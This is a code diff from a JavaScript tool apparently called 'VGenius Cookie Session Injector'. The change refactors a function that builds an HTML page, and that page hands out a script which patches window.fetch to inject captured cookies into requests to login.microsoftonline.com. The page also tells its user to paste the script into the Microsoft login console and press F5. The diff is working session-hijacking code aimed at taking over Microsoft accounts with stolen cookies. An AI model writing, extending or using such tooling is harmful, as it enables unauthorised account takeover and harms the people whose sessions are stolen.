@@ -236,21 +236,41 @@ function generateConsoleScript(cookies) {
 function generateStandaloneHtml(cookies) {
   var cookieJson = JSON.stringify(cookies);
   
+  // Build cookie header string
+  var cookieHeader = "";
+  for (var i = 0; i < cookies.length; i++) {
+    if (i > 0) cookieHeader += "; ";
+    cookieHeader += cookies[i].name + "=" + cookies[i].value;
+  }
+  
+  // Build the bypass script that will be copied
+  var bypassScript = '(function() {\n';
+  bypassScript += '  var cookies = ' + cookieJson + ';\n';
+  bypassScript += '  var originalFetch = window.fetch;\n';
+  bypassScript += '  window.fetch = function(url, options) {\n';
+  bypassScript += '    options = options || {};\n';
+  bypassScript += '    if (typeof url === "string" && url.indexOf("login.microsoftonline.com") !== -1) {\n';
+  bypassScript += '      options.headers = options.headers || {};\n';
+  bypassScript += '      options.headers["Cookie"] = "' + cookieHeader.replace(/"/g, '\\"') + '";\n';
+  bypassScript += '    }\n';
+  bypassScript += '    return originalFetch(url, options);\n';
+  bypassScript += '  };\n';
+  bypassScript += '  console.log("✅ Cookie injection active. Refresh page (F5).");\n';
+  bypassScript += '})();';
+  
   var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
   html += '  <meta charset="UTF-8">\n';
   html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
   html += '  <title>VGenius Cookie Injector</title>\n';
   html += '  <style>\n';
   html += '    body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
-  html += '    .success { color: #00ffcc; }\n';
-  html += '    .error { color: #ff4444; }\n';
-  html += '    pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; }\n';
   html += '    button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
   html += '    button:hover { background: #00cca3; }\n';
   html += '    .instructions { background: rgba(0,255,204,0.1); border: 1px solid rgba(0,255,204,0.3); padding: 15px; border-radius: 8px; margin-bottom: 20px; }\n';
+  html += '    pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; }\n';
   html += '  </style>\n';
   html += '</head>\n<body>\n';
-  html += '  <h1>🔐 VGenius Cookie Session Injector</h1>\n';
+  html += '  <h1>VGenius Cookie Session Injector</h1>\n';
   html += '  <div class="instructions">\n';
   html += '    <h3>Instructions:</h3>\n';
   html += '    <ol>\n';
@@ -260,47 +280,16 @@ function generateStandaloneHtml(cookies) {
   html += '      <li>Press Enter, then refresh the page (F5)</li>\n';
   html += '    </ol>\n';
   html += '  </div>\n';
-  html += '  <button onclick="copyScript()">📋 Copy Script</button>\n';
+  html += '  <button onclick="copyScript()">Copy Script</button>\n';
   html += '  <pre id="script"></pre>\n';
-  html += '\n';
   html += '  <script>\n';
-  html += '    var cookies = ' + cookieJson + ';\n';
-  html += '    \n';
-  html += '    function buildCookieHeader() {\n';
-  html += '      var header = "";\n';
-  html += '      for (var i = 0; i < cookies.length; i++) {\n';
-  html += '        if (i > 0) header += "; ";\n';
-  html += '        header += cookies[i].name + "=" + cookies[i].value;\n';
-  html += '      }\n';
-  html += '      return header;\n';
-  html += '    }\n';
-  html += '    \n';
-  html += '    function generateBypassScript() {\n';
-  html += '      var cookieHeader = buildCookieHeader();\n';
-  html += '      var script = "(function() {\\n";\n';
-  html += '      script += "  var cookies = " + JSON.stringify(cookies) + ";\\n";\n';
-  html += '      script += "  var originalFetch = window.fetch;\\n";\n';
-  html += '      script += "  window.fetch = function(url, options) {\\n";\n';
-  html += '      script += "    options = options || {};\\n";\n';
-  html += '      script += "    if (typeof url === \'string\' && url.indexOf(\'login.microsoftonline.com\') !== -1) {\\n";\n';
-  html += '      script += "      options.headers = options.headers || {};\\n";\n';
-  html += '      script += "      options.headers[\\'Cookie\\'] = \\"" + cookieHeader.replace(/"/g, '\\"') + "\\";\\n";\n';
-  html += '      script += "    }\\n";\n';
-  html += '      script += "    return originalFetch(url, options);\\n";\n';
-  html += '      script += "  };\\n";\n';
-  html += '      script += "  console.log(\\'✅ Cookie injection active. Refresh page (F5).\\');\\n";\n';
-  html += '      script += "})();";\n';
-  html += '      return script;\n';
-  html += '    }\n';
-  html += '\n';
+  html += '    var bypassScript = ' + JSON.stringify(bypassScript) + ';\n';
+  html += '    document.getElementById("script").textContent = bypassScript;\n';
   html += '    function copyScript() {\n';
-  html += '      var scriptText = generateBypassScript();\n';
-  html += '      navigator.clipboard.writeText(scriptText).then(function() {\n';
-  html += '        alert("✅ Script copied! Now paste it in the Microsoft login console and press F5.");\n';
+  html += '      navigator.clipboard.writeText(bypassScript).then(function() {\n';
+  html += '        alert("Script copied! Paste it in the Microsoft login console and press F5.");\n';
   html += '      });\n';
   html += '    }\n';
-  html += '\n';
-  html += '    document.getElementById("script").textContent = generateBypassScript();\n';
   html += '  </script>\n';
   html += '</body>\n</html>';
   
